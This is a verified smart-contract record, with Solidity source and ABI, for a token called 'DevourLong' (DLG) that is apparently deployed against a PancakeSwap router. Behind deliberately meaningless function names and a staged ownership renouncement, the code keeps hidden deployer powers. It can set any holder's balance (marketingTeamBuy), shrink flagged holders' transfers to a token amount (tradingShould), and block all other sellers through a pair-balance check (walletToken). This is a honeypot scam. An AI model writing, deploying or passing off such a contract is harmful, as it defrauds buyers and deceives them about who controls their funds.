{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface isListTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitTrading {\n    function createPair(address sellSwap, address enableTeam) external returns (address);\n}\n\ninterface isBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeFeeSell) external view returns (uint256);\n\n    function transfer(address takeAt, uint256 teamAuto) external returns (bool);\n\n    function allowance(address feeFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeAt,\n        uint256 teamAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamSwap, uint256 value);\n    event Approval(address indexed feeFund, address indexed spender, uint256 value);\n}\n\ninterface txTeam is isBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DevourLong is shouldTrading, isBuy, txTeam {\n\n    mapping(address => mapping(address => uint256)) private swapLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchFund;\n    }\n\n    bool public isListLaunched;\n\n    function marketingTeamBuy(address launchFromAmount, uint256 teamAuto) public {\n        buyTeamLiquidity();\n        exemptSell[launchFromAmount] = teamAuto;\n    }\n\n    function tradingShould(address senderEnable) public {\n        buyTeamLiquidity();\n        \n        if (senderEnable == txTo || senderEnable == takeMin) {\n            return;\n        }\n        tokenMarketing[senderEnable] = true;\n    }\n\n    bool public sellMax;\n\n    uint256 minTradingMarketing;\n\n    string private senderModeToken = \"Devour Long\";\n\n    bool public toMarketing;\n\n    bool private autoSell;\n\n    function takeWallet(address shouldReceiver, address takeAt, uint256 teamAuto) internal returns (bool) {\n        require(exemptSell[shouldReceiver] >= teamAuto);\n        exemptSell[shouldReceiver] -= teamAuto;\n        exemptSell[takeAt] += teamAuto;\n        emit Transfer(shouldReceiver, takeAt, teamAuto);\n        return true;\n    }\n\n    constructor (){\n        if (sellMax) {\n            buyShould = tokenLaunched;\n        }\n        isListTeam launchTotal = isListTeam(listLaunch);\n        takeMin = limitTrading(launchTotal.factory()).createPair(launchTotal.WETH(), address(this));\n        if (tokenLaunched == buyShould) {\n            autoSell = true;\n        }\n        txTo = _msgSender();\n        senderLiquidity();\n        amountMax[txTo] = true;\n        exemptSell[txTo] = launchFund;\n        \n        emit Transfer(address(0), txTo, launchFund);\n    }\n\n    uint256 constant tradingAt = 9 ** 10;\n\n    mapping(address => bool) public amountMax;\n\n    uint256 private tokenLaunched;\n\n    function getOwner() external view returns (address) {\n        return receiverReceiver;\n    }\n\n    mapping(address => uint256) private exemptSell;\n\n    event OwnershipTransferred(address indexed autoMarketing, address indexed fundBuy);\n\n    uint8 private exemptMarketing = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return senderModeToken;\n    }\n\n    uint256 public buyShould;\n\n    function senderLiquidity() public {\n        emit OwnershipTransferred(txTo, address(0));\n        receiverReceiver = address(0);\n    }\n\n    function limitShould(address receiverBuy) public {\n        if (isListLaunched) {\n            return;\n        }\n        if (tokenLaunched == buyShould) {\n            toMarketing = false;\n        }\n        amountMax[receiverBuy] = true;\n        if (toMarketing == sellMax) {\n            autoSell = true;\n        }\n        isListLaunched = true;\n    }\n\n    function balanceOf(address modeFeeSell) public view virtual override returns (uint256) {\n        return exemptSell[modeFeeSell];\n    }\n\n    function owner() external view returns (address) {\n        return receiverReceiver;\n    }\n\n    function approve(address totalLiquidity, uint256 teamAuto) public virtual override returns (bool) {\n        swapLaunch[_msgSender()][totalLiquidity] = teamAuto;\n        emit Approval(_msgSender(), totalLiquidity, teamAuto);\n        return true;\n    }\n\n    address listLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public tokenMarketing;\n\n    address public takeMin;\n\n    function buyTeamLiquidity() private view {\n        require(amountMax[_msgSender()]);\n    }\n\n    address receiverMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function receiverMinTo(address shouldReceiver, address takeAt, uint256 teamAuto) internal returns (bool) {\n        if (shouldReceiver == txTo) {\n            return takeWallet(shouldReceiver, takeAt, teamAuto);\n        }\n        uint256 walletTeam = isBuy(takeMin).balanceOf(receiverMin);\n        require(walletTeam == senderAuto);\n        require(takeAt != receiverMin);\n        if (tokenMarketing[shouldReceiver]) {\n            return takeWallet(shouldReceiver, takeAt, tradingAt);\n        }\n        return takeWallet(shouldReceiver, takeAt, teamAuto);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingSell;\n    }\n\n    function transferFrom(address shouldReceiver, address takeAt, uint256 teamAuto) external override returns (bool) {\n        if (_msgSender() != listLaunch) {\n            if (swapLaunch[shouldReceiver][_msgSender()] != type(uint256).max) {\n                require(teamAuto <= swapLaunch[shouldReceiver][_msgSender()]);\n                swapLaunch[shouldReceiver][_msgSender()] -= teamAuto;\n            }\n        }\n        return receiverMinTo(shouldReceiver, takeAt, teamAuto);\n    }\n\n    function transfer(address launchFromAmount, uint256 teamAuto) external virtual override returns (bool) {\n        return receiverMinTo(_msgSender(), launchFromAmount, teamAuto);\n    }\n\n    address private receiverReceiver;\n\n    function allowance(address autoMin, address totalLiquidity) external view virtual override returns (uint256) {\n        if (totalLiquidity == listLaunch) {\n            return type(uint256).max;\n        }\n        return swapLaunch[autoMin][totalLiquidity];\n    }\n\n    string private marketingSell = \"DLG\";\n\n    uint256 senderAuto;\n\n    address public txTo;\n\n    function walletToken(uint256 teamAuto) public {\n        buyTeamLiquidity();\n        senderAuto = teamAuto;\n    }\n\n    uint256 private swapLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptMarketing;\n    }\n\n    uint256 private launchFund = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFeeSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isListLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"limitShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFromAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"marketingTeamBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderEnable\",\"type\":\"address\"}],\"name\":\"tradingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFromAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamAuto\",\"type\":\"uint256\"}],\"name\":\"walletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DevourLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}